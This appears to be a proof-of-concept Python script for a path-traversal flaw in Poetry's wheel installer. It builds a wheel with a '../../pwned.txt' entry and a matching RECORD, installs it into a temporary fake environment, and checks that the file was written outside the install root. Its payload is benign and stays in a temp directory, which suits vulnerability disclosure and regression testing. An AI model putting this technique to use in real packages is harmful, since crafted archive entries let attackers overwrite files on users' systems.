import base64, hashlib, tempfile, zipfile
from pathlib import Path
from poetry.installation.wheel_installer import WheelInstaller

def rec(p, d):
    h = base64.urlsafe_b64encode(hashlib.sha256(d).digest()).rstrip(b"=").decode()
    return f"{p},sha256={h},{len(d)}"

tmp = Path(tempfile.mkdtemp()).resolve()
root = tmp / "env"
files = {
    "../../pwned.txt": b"owned",
    "demo-1.0.dist-info/METADATA": b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n",
    "demo-1.0.dist-info/WHEEL": b"Wheel-Version: 1.0\nRoot-Is-Purelib: true\nTag: py3-none-any\n",
}
whl = tmp / "demo-1.0-py3-none-any.whl"
with zipfile.ZipFile(whl, "w") as z:
    for p, d in files.items():
        z.writestr(p, d)
    z.writestr("demo-1.0.dist-info/RECORD",
               "\n".join(rec(p, d) for p, d in files.items()) + "\ndemo-1.0.dist-info/RECORD,,\n")

class Env:
    python = root / "bin/python"
    scheme_dict = {k: str(root / k) for k in ("purelib", "platlib", "scripts", "data", "include")}

WheelInstaller(Env()).install(whl)
print((tmp / "pwned.txt").exists(), (tmp / "pwned.txt").read_text())
